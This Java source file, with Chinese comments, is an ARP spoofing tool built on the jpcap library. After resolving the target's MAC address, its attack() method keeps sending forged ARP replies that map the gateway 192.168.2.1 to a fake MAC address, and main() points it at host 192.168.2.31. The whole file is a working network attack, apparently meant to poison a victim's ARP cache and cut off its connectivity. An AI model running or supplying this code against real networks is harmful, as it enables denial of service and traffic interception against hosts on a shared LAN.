import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;
import java.io.IOException;
import java.net.InetAddress;
import java.util.Arrays;


public class ArpClient {


    private static NetworkInterface device = JpcapCaptor.getDeviceList()[0];

    /**
     * 本地IP接收ARP包
     */
    private static final String LOCAL_HOST_IP = "192.168.2.28";


     //通过IP地址获取MAC地址。

    private static byte[] getMacByIP(String ip) throws IOException {
        //打开网络设备
        JpcapCaptor jpcapCaptor = JpcapCaptor.openDevice(device, 2000, false, 3000);
        //发送器JpcapSender，用来发送报文
        JpcapSender jpcapSender = jpcapCaptor.getJpcapSenderInstance();


        InetAddress senderIP = InetAddress.getByName(LOCAL_HOST_IP);
        //目标主机的IP地址
        InetAddress targetIP = InetAddress.getByName(ip);

        ARPPacket arp = new ARPPacket();
        //硬件类型 1 代表以太网
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        //协议类型 ip协议
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        //硬件地址长度
        arp.hlen = 6;
        //协议地址长度
        arp.plen = 4;
        //Opcode 操作类型 request
        arp.operation = ARPPacket.ARP_REQUEST;

        //ARP包的发送端以太网地址
        arp.sender_hardaddr = device.mac_address;
        //发送端IP地址
        arp.sender_protoaddr = senderIP.getAddress();

        byte[] broadcast = new byte[]{(byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255, (byte) 255};
        //设置目的端的以太网地址为广播地址
        arp.target_hardaddr = broadcast;
        //目的端IP地址
        arp.target_protoaddr = targetIP.getAddress();

        //添加以太网首部
        EthernetPacket ether = new EthernetPacket();
        ether.dst_mac = broadcast;
        ether.src_mac = device.mac_address;
        //上层协议
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        //将arp包设置以太网头部
        arp.datalink = ether;


        while (true) {
            jpcapSender.sendPacket(arp);
            Packet packet = jpcapCaptor.getPacket();
            if (packet instanceof ARPPacket) {
                ARPPacket arpPacket = (ARPPacket) packet;
                if (Arrays.equals(arpPacket.target_protoaddr, senderIP.getAddress())) {
                    System.out.println("success mac=" + Arrays.toString(arpPacket.sender_hardaddr));
                    return arpPacket.sender_hardaddr;
                }
            }
            try {
                Thread.sleep(200);
            } catch (InterruptedException ignore) {
            }
        }
    }


    private static byte[] stomac(String macAddr) {
        byte[] mac = new byte[]{(byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00};
        String[] temp = macAddr.split("-");
        for (int x = 0; x < temp.length; x++) {
            mac[x] = (byte) ((Integer.parseInt(temp[x], 16)) & 0xff);
        }
        return mac;
    }


    private static void attack(String ip, int time) throws InterruptedException, IOException {
        JpcapCaptor jpcap = JpcapCaptor.openDevice(device, 65535, false, 3000);
        jpcap.setFilter("arp", true);
        JpcapSender sender = JpcapSender.openDevice(device);

        ARPPacket arp = new ARPPacket();
        //硬件类型
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        //协议类型
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        //指明是ARP应答包包
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;

        byte[] srcmac = stomac("00-00-00-FE-C1-23");
        arp.sender_hardaddr = srcmac;
        //设置网关
        arp.sender_protoaddr = InetAddress.getByName("192.168.2.1").getAddress();

        arp.target_hardaddr = getMacByIP(ip);
        arp.target_protoaddr = InetAddress.getByName(ip).getAddress();

        //设置数据链路层的帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = srcmac;
        ether.dst_mac = getMacByIP(ip);
        arp.datalink = ether;

        int i = 0;
        while (true) {
            sender.sendPacket(arp);
            System.out.println("Arp send success");
            Thread.sleep(time);
            i++;
            if (i > 1000000000) {
                break;
            }
        }
    }

    public static void main(String[] args) throws InterruptedException, IOException {
        System.out.println(System.getProperty("java.library.path"));
        attack("192.168.2.31", 500);
    }
}